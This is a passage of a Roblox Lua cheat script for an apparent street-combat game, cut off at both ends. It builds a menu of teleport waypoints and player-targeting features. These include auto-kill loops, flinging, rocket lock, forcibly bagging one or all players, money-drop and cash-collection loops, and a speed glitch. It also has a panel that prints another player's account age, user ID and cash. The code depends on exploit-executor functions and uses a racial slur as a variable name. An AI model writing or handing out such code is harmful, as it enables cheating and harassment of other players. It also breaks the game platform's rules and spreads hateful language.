  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-461.022675, 39.0414619, -283.707703, -0.023345245, -1.00733708e-07, -0.999727488, 2.07986917e-09, 1, -1.00809736e-07, 0.999727488, -4.43273018e-09, -0.023345245)
 end
)

waypoints:Button(
    "Admin Base",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-799.216919, -39.6511879, -891.566223, 0.99999994, 5.73567194e-09, -0.000246100419, -5.74908343e-09, 1, -5.44949863e-08, 0.000246100419, 5.44964003e-08, 0.99999994)
 end
)

waypoints:Button(
    "Playground",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-297.029114, 42.4132347, -760.332214, 0.991061628, 4.51803794e-09, -0.133404627, 5.6251741e-09, 1, 7.5656537e-08, 0.133404627, -7.57307177e-08, 0.991061628)
 end
)

waypoints:Button(
    "Sewers",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(84.4671478, -38.002018, -295.797638, 0.0220847819, 1.141754e-07, -0.999756098, 1.23770549e-08, 1, 1.14476663e-07, 0.999756098, -1.49022288e-08, 0.0220847819)
 end
)

waypoints:Button(
    "Police Station / Jail [ ð®ð» ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-295.76358, 22.4979897, -42.3029442, 0.0831894949, 6.1865471e-08, 0.996533751, -2.20108234e-08, 1, -6.02432166e-08, -0.996533751, -1.69229253e-08, 0.0831894949)
 end
)

waypoints:Button(
    "School [ ð« ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-586.106201, 21.8730183, 290.124817, 0.995514214, -5.68094105e-09, -0.0946118087, 8.07022182e-09, 1, 2.48708911e-08, 0.0946118087, -2.55228656e-08, 0.995514214)
 end
)

waypoints:Button(
    "Gunshop #1 [ ð« ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-580.786316, 8.31280422, -737.403931, 0.99997884, -2.20790719e-09, 0.00650190376, 2.2303821e-09, 1, -3.44942008e-09, -0.00650190376, 3.46384899e-09, 0.99997884)
 end
)

waypoints:Button(
    "Gunshop #2 [ ð« ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(475.022003, 48.0030136, -603.737, 1, -6.25862873e-09, -2.83383207e-13, 6.25862873e-09, 1, 1.24807213e-08, 2.83305091e-13, -1.24807213e-08, 1)
 end
)

waypoints:Button(
    "Food Store #1 [ ð² ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-333.492065, 23.6806679, -292.959625, 1, -4.39840662e-08, -2.50952018e-15, 4.39840662e-08, 1, 8.76975577e-08, -1.34777479e-15, -8.76975577e-08, 1)
 end
)

waypoints:Button(
    "Food Store #2 [ ð² ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(301.570923, 49.2806778, -621.864075, 0.998264611, -6.56088961e-10, -0.0588875674, 6.40455022e-10, 1, -2.84361951e-10, 0.0588875674, 2.46153625e-10, 0.998264611)
 end
)

waypoints:Button(
    "Taco Shop [ ð² ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(573.426514, 51.0594254, -478.298065, 0.00876330957, -2.38779467e-08, -0.999961615, -7.68338353e-08, 1, -2.45522092e-08, 0.999961615, 7.70460389e-08, 0.00876330957)
 end
)

waypoints:Button(
    "All Guns [ ð«ð«ð« ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872, -38.4011879, -546, 1, 4.52202293e-08, -2.68115214e-15, -4.52202293e-08, 1, -7.86592622e-08, -8.75837891e-16, 7.86592622e-08, 1)
 end
)

waypoints:Button(
    "Gas Station [ â½ ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(592.256226, 48.9980621, -258.91214, 0.0758034363, -1.55681974e-08, 0.997122765, -9.84404558e-10, 1, 1.56879558e-08, -0.997122765, -2.17077312e-09, 0.0758034363)
 end
)

waypoints:Button(
    "Skate Park",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-825.685974, 21.9978447, -549.29303, 1, 2.11031281e-08, 2.74902409e-14, -2.11031281e-08, 1, 3.53087621e-08, -2.67451144e-14, -3.53087621e-08, 1)
 end
)

waypoints:Button(
    "Casino [ ð° ]",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-861.977722, 21.7480202, -132.355377, -0.999999285, -6.8944539e-09, -0.00117591582, -6.89774327e-09, 1, 2.7933762e-09, 0.00117591582, 2.80148527e-09, -0.999999285)
 end
)

waypoints:Button(
    "Trailor",
    function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-950, -1.23643661, 470, 1, -6.8544721e-09, 2.70041253e-14, 6.8544721e-09, 1, 8.68197532e-08, -2.75992286e-14, -8.68197532e-08, 1)
 end
)

waypoints:Button(
 "Circus [ ð¤¡ðª ]",
 function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(142, 24.731184, -988, 1, -5.8611306e-08, 1.40257119e-14, 5.8611306e-08, 1, -3.11978994e-08, -1.21971626e-14, 3.11978994e-08, 1)

 end
)

waypoints:Button(
 "theatre [ ð¥ð¿ ]",
 function()
  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1004.41998, 21.2311783, -180.738998, 1, -8.01115263e-08, 2.51585895e-14, 8.01115263e-08, 1, -4.26443165e-08, -2.17422871e-14, 4.26443165e-08, 1)
 end

)

-- // target right here

local TargetT = serv:Channel("Target")

local FlingLocked = false

local target_ = nil

TargetT:Textbox(
    "Target",
    "Type you're target here!",
    true,
    function(target) -- // this function finds the target!
        for i,v in pairs(game.Players:GetChildren()) do
            if v.Name ~= game.Players.LocalPlayer.Name then
                if string.sub(string.lower(v.Name),1,string.len(target)) == string.lower(target) or string.sub(string.lower(v.DisplayName),1,string.len(target)) == string.lower(target)  then
     NotifyLibrary.Notify({
      Title = "Target Found!",
      Description = "Player: "..v.Name.." / "..v.DisplayName,
      Duration = 2
     })
                    Target = v
                    TargetV = v.Name
                    return
                end
            end
        end
  NotifyLibrary.Notify({
   Title = "ERROR",
   Description = "No target found.",
   Duration = 2
  })
    end
)

function FistAttack()
 if getgenv().LightMode == false then
  if game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat') then
   game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
  else
   game:service'Players'.LocalPlayer.Backpack:FindFirstChild('Combat').Parent = game:service'Players'.LocalPlayer.Character
  end   
 else
  if game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat') then
   game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
   game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Deactivate()
  else
   game:service'Players'.LocalPlayer.Backpack:FindFirstChild('Combat').Parent = game:service'Players'.LocalPlayer.Character
  end  
 end
end

getgenv().LightMode = false

    function FistAttack()
        if getgenv().LightMode == false then
            if game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat') then
                game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
            else
                game:service'Players'.LocalPlayer.Backpack:FindFirstChild('Combat').Parent = game:service'Players'.LocalPlayer.Character
            end   
        else
            if game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat') then
                game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Activate()
                game:service'Players'.LocalPlayer.Character:FindFirstChild('Combat'):Deactivate()
            else
                game:service'Players'.LocalPlayer.Backpack:FindFirstChild('Combat').Parent = game:service'Players'.LocalPlayer.Character
            end  
        end
    end

 TargetT:Dropdown(
    "Auto-Kill Option",
    {"Light", "Heavy"},
    function(Option)
        if Option == "Light" then
            getgenv().LightMode = true
        else
            getgenv().LightMode = false
        end
    end
)

--[[
 elseif Target.Character.BodyEffects.GunFiring.Value == true then
        game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, -19.5, 0)
]]
TargetT:Toggle(
    "Auto-Kill [ Above-Ground ]",
    false,
    function(Killing)
        if Killing == true then
   NotifyLibrary.Notify({
    Title = "Auto-Kill [ Above-Ground ]",
    Description = "Toggled to: True",
    Duration = 1
   })
            game:service'RunService':BindToRenderStep('Attacking', 2000, function()
                if Target.Character:FindFirstChild('BodyEffects') and game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Target.Character:FindFirstChild('HumanoidRootPart') and Target then
                if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid') then
                    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
                    end
                    if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                    if Target.Character.BodyEffects['K.O'].Value == false then
                        if Target.Character.BodyEffects.Attacking.Value == true then
                            FistAttack()
                            game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, -19.5, 0)
                            elseif Target.Character.BodyEffects.Attacking.Value == false  then
                                FistAttack()
                                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0)
                            end
                            elseif Target.Character.BodyEffects['K.O'].Value == true and Target.Character:FindFirstChild('LowerTorso') and Target then
                            game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.LowerTorso.Position) * CFrame.new(0,3,0)
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")

                        end
                    end
                end)
                elseif Killing == false then
     NotifyLibrary.Notify({
     Title = "Auto-Kill [ Above-Ground ]",
     Description = "Toggled to: False",
     Duration = 1
    })
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
                game:service'RunService':UnbindFromRenderStep('Attacking')

            end
        end
)

TargetT:Toggle(
    "Auto-Kill [ Under-Ground ]",
    false,
    function(Killing)
        if Killing == true then
   NotifyLibrary.Notify({
    Title = "Auto-Kill [ Under-Ground ]",
    Description = "Toggled to: True",
    Duration = 1
   })
            game:service'RunService':BindToRenderStep('Attacking', 2000, function()
                if Target.Character:FindFirstChild('BodyEffects') and game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart') and Target.Character:FindFirstChild('HumanoidRootPart') and Target then
                if game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid') then
                    game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
                    end
                    if game.Players.LocalPlayer.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                            if (v.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.LeftHand.Position).Magnitude <= 50 then
                                if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") then
                                    if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool"):FindFirstChild('Handle') then
                                        firetouchinterest(game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Handle, v.Character.UpperTorso, 0)
                                    else
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftHand'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftFoot'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['RightLowerLeg'], v.Character.UpperTorso, 0)
                                        firetouchinterest(game.Players.LocalPlayer.Character['LeftLowerLeg'], v.Character.UpperTorso, 0)
                                    end
                                end
                            end
                        end
                    end
                    if Target.Character.BodyEffects['K.O'].Value == false then
                        if Target.Character.BodyEffects.Attacking.Value == true then
                            FistAttack()
                            game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, -19.5, 0)
                            elseif Target.Character.BodyEffects.Attacking.Value == false  then
                                FistAttack()
                                game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, -7, 0)
                            end
                            elseif Target.Character.BodyEffects['K.O'].Value == true and Target.Character:FindFirstChild('LowerTorso') and Target then
                            game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Target.Character.LowerTorso.Position) * CFrame.new(0,3,0)
                        game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
                        end
                    end
                end)
                elseif Killing == false then
     NotifyLibrary.Notify({
     Title = "Auto-Kill [ Under-Ground ]",
     Description = "Toggled to: False",
     Duration = 1
    })
                game:GetService("ReplicatedStorage").MainEvent:FireServer("Stomp")
                game:service'RunService':UnbindFromRenderStep('Attacking')

            end
        end
)

-- // Fling.

player = game.Players.LocalPlayer
        local Loop
        local OldFlingPos = player.Character.HumanoidRootPart.Position
        local loopFunction = function()
            local success,err = pcall(function()
                local FlingEnemy = game.Players:FindFirstChild(TargetV).Character
                if FlingEnemy and player.Character then
                    FlingTorso = FlingEnemy.UpperTorso
                    local dis = 3.85
                    local increase = 6
                    if FlingEnemy.Humanoid.MoveDirection.X < 0 then
                        xchange = -increase
                    elseif FlingEnemy.Humanoid.MoveDirection.X > 0  then
                        xchange = increase
                    else
                        xchange = 0
                    end
                    if FlingEnemy.Humanoid.MoveDirection.Z < 0 then
                        zchange = -increase
                    elseif FlingEnemy.Humanoid.MoveDirection.Z > 0 then
                        zchange = increase
                    else
                        zchange = 0
                    end          
                    if player.Character then
                        player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(FlingTorso.Position.X + math.random(-dis,dis) + xchange, FlingTorso.Position.Y, FlingTorso.Position.Z + math.random(-dis,dis) + zchange) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X + 350),math.rad(player.Character.HumanoidRootPart.Orientation.Y + 200),math.rad(player.Character.HumanoidRootPart.Orientation.Z + 240))
                        player.Character.HumanoidRootPart.Velocity = Vector3.new(500000,500000,500000)
                    end
                end
            end)
            if err then
            end
        end;
        local Start = function()    
            OldFlingPos = player.Character.HumanoidRootPart.Position
            Loop = game:GetService("RunService").Heartbeat:Connect(loopFunction);
        end;
        local Pause = function()
            Loop:Disconnect()
            local vectorZero = Vector3.new(0, 0, 0)
            player.Character.PrimaryPart.Velocity = vectorZero
            player.Character.PrimaryPart.RotVelocity = vectorZero
            player.Character.HumanoidRootPart.CFrame = CFrame.new(OldFlingPos) * CFrame.Angles(math.rad(0),math.rad(137.92),math.rad(0))
        end;

TargetT:Toggle("Fling", false, function(bool)
 if bool == true then
  Start()
 elseif bool == false then
  Pause()
 end
end)  

_G.RocketLock = false
game:GetService"RunService".RenderStepped:Connect(function()
 if _G.RocketLock == true then
  if game.Workspace.Ignored:FindFirstChild("Launcher")then
   local lol = game.Workspace.Ignored:FindFirstChild("Launcher")
   if lol:FindFirstChildOfClass("BodyVelocity") then
    wait()
    lol.BodyVelocity:Destroy()
   end

   if lol:FindFirstChild("BodyVelocity") == nil then
    lol.CFrame = CFrame.new(workspace.Players[TargetV].Head.CFrame.X,workspace.Players[TargetV].Head.CFrame.Y+6,workspace.Players[TargetV].Head.CFrame.Z)
   end

  elseif game.Workspace.Ignored:FindFirstChild("Handle")then
   local lol = game.Workspace.Ignored:FindFirstChild("Handle")

   if lol:FindFirstChild("Pin") then
    lol.CFrame = CFrame.new(workspace.Players[TargetV].Head.CFrame.X,workspace.Players[TargetV].Head.CFrame.Y+1,workspace.Players[TargetV].Head.CFrame.Z)
   end
  end
 end
end)

TargetT:Toggle(
 "Rocket Lock",
 false,
 function(TopG)
  if TopG == true then
   _G.RocketLock = true
  elseif TopG == false then
   _G.RocketLock = false
  end
 end
)
TargetT:Toggle(
 "Head-Sit",
 false,
 function(sitting)

if sitting == true then
 while task.wait() do
 local TargetPlr = TargetV
 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.Head.CFrame
 game.Players.LocalPlayer.Character.Humanoid.Sit = true
 end
elseif sitting == false then
 game.Players.LocalPlayer.Character.Humanoid.Sit = false 
end
end
)

TargetT:Toggle(
 "View",
 false,
 function(viewing)

if viewing == true then
 local TargetPlr = TargetV
 game.Workspace.Camera.CameraSubject = game.Players[TargetPlr].Character.Humanoid
elseif viewing == false then
 game.Workspace.Camera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
end
end
)


TargetT:Button(
    "Go To",
    function()
        local TargetPlr = TargetV
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[TargetPlr].Character.HumanoidRootPart.CFrame
    end
)


TargetT:Button(
    "Bag",
    function()
        local TargetPlr = TargetV
        function getRoot(char)
            local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
            return rootPart
        end
    
        if TargetPlr and game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop['[BrownBag] - $25'].Head.CFrame
            wait(.30)
            fireclickdetector(game.Workspace.Ignored.Shop['[BrownBag] - $25'].ClickDetector)
            game.Players.LocalPlayer.Backpack:WaitForChild("[BrownBag]").Parent = game.Players.LocalPlayer.Character
    
            wait(.5)
            repeat
                pcall(function()
                    wait()
                    getRoot(game.Players[TargetPlr].Character).CFrame = getRoot(game.Players.LocalPlayer.Character).CFrame + Vector3.new(1,3,0)
                    game.Players.LocalPlayer.Character["[BrownBag]"]:Activate()
                end)
            until game.Players[TargetPlr].Character:FindFirstChild("Christmas_Sock")
        elseif game.Players[TargetPlr].Character.BodyEffects['K.O'].Value == false then
        end
    end
)

TargetT:Label("Other Stuff.")
TargetT:Button(
 "Info ( Press F9 )",
 function()
  print(""..game:GetService("Players")[TargetV].Name.." Has:")
  print"================"
  for i, v in pairs(game:GetService("Players")[TargetV].Backpack:GetDescendants()) do
   if v:IsA("Tool") then
    print(""..v.Name.."")
   end
  end
  print("Enclosed Info Collecter")
  print(""..game:GetService("Players")[TargetV].Name.." | Information:")
  print("=================")
  print("Account Age: "..game:GetService("Players")[TargetV].AccountAge)
  print("User ID: "..game:GetService("Players")[TargetV].UserId)
  print("Cash: $"..game:GetService("Players")[TargetV].DataFolder.Currency.Value)
  print("Wanted: "..game:GetService("Players")[TargetV].DataFolder.Information.Wanted.Value)
  print("Crew ID: "..game:GetService("Players")[TargetV].DataFolder.Information.Crew.Value)
  print("Sound ID: "..game:GetService("Players")[TargetV].Character.LowerTorso.BOOMBOXSOUND.SoundId)
 end
)

TargetT:Button(
 "Copy Targets UserID",
 function()
  setclipboard(game:GetService("Players")[TargetV].UserId)
 end
)

TargetT:Button(
 "Copy Targets Username",
 function()
  setclipboard(game:GetService("Players")[TargetV].Name)
 end
)

-- // functions
local BooleanValues = {
    Dropping = false
}

game:GetService("RunService").Stepped:Connect(function()
    if BooleanValues['Dropping'] then
        game.ReplicatedStorage.MainEvent:FireServer("DropMoney",10000)
    elseif BooleanValues['CashAura'] then
        for i,v in pairs(game.Workspace.Ignored.Drop:GetChildren()) do
            if v:IsA("Part") and (v.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 15 and v:FindFirstChild("ClickDetector") then
                pcall(function()
                    fireclickdetector(v.ClickDetector)
                end)
            end
        end
    end
end)

-- // auto buy
local autobuy = serv:Channel("Autobuys")

for i,v in pairs(game.Workspace.Ignored.Shop:GetChildren()) do
autobuy:Button(
    "Buy "..v.Name,
    function()
        local player = game:GetService("Players");
        local localplayer = player.LocalPlayer;
        local localCharacter = localplayer.Character;
        
        local OldPos = localCharacter.HumanoidRootPart.Position;
        localCharacter.HumanoidRootPart.CFrame = game.Workspace.Ignored.Shop[v.Name].Head.CFrame + Vector3.new(0,2,0);
        local itemclick = game.Workspace.Ignored.Shop[v.Name];
        wait(.30);
        fireclickdetector(game:GetService("Workspace").Ignored.Shop[v.Name].ClickDetector);    
        wait(.40);
        localCharacter.HumanoidRootPart.CFrame = CFrame.new(OldPos);
        end
)
end
-- // fun stuff

local fun = serv:Channel("Fun Stuff")

_G.RocketRide = false

game:GetService("Workspace").Ignored.ChildAdded:Connect(function(Added)
if _G.RocketRide == true and Added.Name == "Launcher" and (game:GetService("Players").LocalPlayer.Character.LowerTorso.Position - Added.Position).Magnitude <=30 then
BodyPosition = Instance.new("BodyPosition", game:GetService("Players").LocalPlayer.Character.LowerTorso)
BodyPosition.D = 400
repeat
game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Sit = true
BodyPosition.Position = Added.Position + Vector3.new(0, 3, 0)
game:GetService("RunService").Heartbeat:Wait()
until not game:GetService("Workspace").Ignored:FindFirstChild(Added.Name) or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").Sit == false
BodyPosition:Destroy()
end
end)


fun:Toggle(
 "Rocket Ride",
 false,
 function(v)
  if v == true then
   _G.RocketRide = true
  elseif v == false then
   _G.RocketRide = false
  end
 end
)
fun:Button(
    "Chat Logs",
    function()
        local LP = game.Players.LocalPlayer
  LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Visible = true
  LP.PlayerGui.Chat.Frame.ChatBarParentFrame.Position = LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Position + UDim2.new(UDim.new(),LP.PlayerGui.Chat.Frame.ChatChannelParentFrame.Size.Y)
 end
)

fun:Button(
 "DO A FLIP",
 function()
  local Player = game.Players.LocalPlayer
  local niggers = Player.Character:FindFirstChildWhichIsA("Humanoid"):LoadAnimation(game.ReplicatedStorage.ClientAnimations.Roll)
  niggers:Play()
 end
)
fun:Button(
 "Bag All",
 function()
  gsPlayers = game:GetService("Players")
LP = game.Players.LocalPlayer
local players = {}

 for i,v in pairs(gsPlayers:GetPlayers()) do
            table.insert(players,v)
        end

if LP.Backpack:FindFirstChild("[BrownBag]") then
 LP.Backpack:FindFirstChild("[BrownBag]").Parent = LP.Character
end    
    for i,qr in ipairs(LP.Backpack:GetChildren()) do
        if qr.Name == "[BrownBag]" then qr.Parent = LP.Character
    end
         end
    wait(0.1)
    
 cf = LP.Character.Head.CFrame
    
    for i,v in pairs(players) do
        LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-316.639923, 51.1817589, -723.638306))
        wait(0.1)
    for i = 1,20 do
 v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.2
    for i = 1,20 do
        if LP.Backpack:FindFirstChild("[BrownBag]") then
            LP.Backpack:FindFirstChild("[BrownBag]").Parent = LP.Character
        end    
fireclickdetector(game:GetService("Workspace").Ignored.Shop["[BrownBag] - $25"].ClickDetector)
    for i,q in ipairs(LP.Backpack:GetChildren()) do
        if q.Name == "[BrownBag]" then q.Parent = LP.Character
             v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.2
        end
         end
            end
            end
wait(0.1)
    for i,q in ipairs(LP.Backpack:GetChildren()) do
        if q.Name == "[BrownBag]" then q.Parent = LP.Character
             v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.2
    end
         end
    wait(0.2)
    for i,q in ipairs(LP.Character:GetChildren()) do
        if q.Name == "[BrownBag]" then q.Parent = LP.Backpack
                q.Parent = LP.Character
                    v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.2
        end
        end
    mouse1click()
wait(0.25)
    for i = 1,25 do
        if LP.Backpack:FindFirstChild("[BrownBag]") then
            LP.Backpack:FindFirstChild("[BrownBag]").Parent = LP.Character
    end    
    mouse1click()
         v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.25
        wait(0.05)
            mouse1click()
                    v.Character.HumanoidRootPart.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 1.25
                end
wait(0.1)
                            end
wait(0.25)
    LP.Character.HumanoidRootPart.CFrame = cf
      end
)
fun:Button(
    "Toggle Speed Glitch [Y]",
    function()
        local Player = game:GetService("Players").LocalPlayer
  local Mouse = Player:GetMouse()
  local SpeedGlitch = false
  local Wallet = Player.Backpack:FindFirstChild("Wallet")

  local UniversalAnimation = Instance.new("Animation")

  function stopTracks()
   for _, v in next, game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):GetPlayingAnimationTracks() do
    if (v.Animation.AnimationId:match("rbxassetid")) then
     v:Stop()
    end
   end
  end

  function loadAnimation(id)
   if UniversalAnimation.AnimationId == id then
    stopTracks()
    UniversalAnimation.AnimationId = "1"
   else
    UniversalAnimation.AnimationId = id
    local animationTrack = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):LoadAnimation(UniversalAnimation)
    animationTrack:Play()
   end
  end

  Mouse.KeyDown:Connect(function(Key)
   if Key == "y" then
    SpeedGlitch = not SpeedGlitch
    if SpeedGlitch == true then
     loadAnimation("rbxassetid://3189777795")
     wait(1.5)
     Wallet.Parent = Player.Character
     wait(0.15)
     Player.Character:FindFirstChild("Wallet").Parent = Player.Backpack
     wait(0.05)
     repeat game:GetService("RunService").Heartbeat:wait()
      keypress(0x49)
      game:GetService("RunService").Heartbeat:wait()
      keypress(0x4F)
      game:GetService("RunService").Heartbeat:wait()
      keyrelease(0x49)
      game:GetService("RunService").Heartbeat:wait()
      keyrelease(0x4F)
      game:GetService("RunService").Heartbeat:wait()
     until SpeedGlitch == false
    end
   end
  end)
 end
)

fun:Button(
 "No-Fog",
 function()
  game.Lighting.FogEnd = 9e9
 end
)

fun:Button(
 "Infinite Zoom",
 function()
  game.Players.LocalPlayer.CameraMaxZoomDistance = 1000
 end
)

fun:Button(
 "Open Admin Base",
 function()
  local Part = workspace['MAP']['EVIL_SPECIAL']
  -- Open
  for i=1,52 do
   Part.CFrame = Part.CFrame + Vector3.new(0,.5,0)
   wait()
  end
 end
)

fun:Button(
 "Close Admin Base",
 function()
  local Part = workspace['MAP']['EVIL_SPECIAL']
  -- // close
  for i=1,52 do
   Part.CFrame = Part.CFrame - Vector3.new(0,.5,0)
   wait()
  end
 end
)

fun:Button(
 "FE Titan (Needs Max Muscle)",
 function()
  function Main(a)local b=game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')local function c()for d,e in pairs(game.Players.LocalPlayer.Character:GetDescendants())do if e.Name=='OriginalSize'then e:Destroy()end;if e.Name=='OriginalPosition'then e:Destroy()end end end;local function f()wait(a)c()b:FindFirstChild("BodyWidthScale"):Destroy()end;local function g()wait(a)c()b:FindFirstChild("BodyDepthScale"):Destroy()end;local function h()wait(a)c()b:FindFirstChild("HeadScale"):Destroy()end;local function i()wait(a)c()b:FindFirstChild("BodyTypeScale"):Destroy()end;i()h()g()f()end;Main(.8)

    end
)

fun:Button(
 "FE Ant (Needs Max Skinny)",
 function()
  function Main(a)local b=game.Players.LocalPlayer.Character:FindFirstChildWhichIsA('Humanoid')local function c()for d,e in pairs(game.Players.LocalPlayer.Character:GetDescendants())do if e.Name=='OriginalSize'then e:Destroy()end;if e.Name=='OriginalPosition'then e:Destroy()end end end;local function f()wait(a)c()b:FindFirstChild("BodyWidthScale"):Destroy()end;local function g()wait(a)c()b:FindFirstChild("BodyDepthScale"):Destroy()end;local function h()wait(a)c()b:FindFirstChild("HeadScale"):Destroy()end;local function i()wait(a)c()b:FindFirstChild("BodyTypeScale"):Destroy()end;i()h()g()f()end;Main(.8)

    end
)

fun:Button(
 "X-Ray",
 function()
  pcall(function()
            game.Players.LocalPlayer.DevCameraOcclusionMode = Enum.DevCameraOcclusionMode.Invisicam
        end)
        game.Lighting.FogEnd = 99999999999999999999
        game:GetService('Lighting').Brightness = 1
        game:GetService('Lighting').GlobalShadows = false
        game.Players.localPlayer.CameraMaxZoomDistance = 150
        game.Players.LocalPlayer.CameraMinZoomDistance = 0
    end
)


fun:Button(
 "Walk On Walls [Z]",
 function()
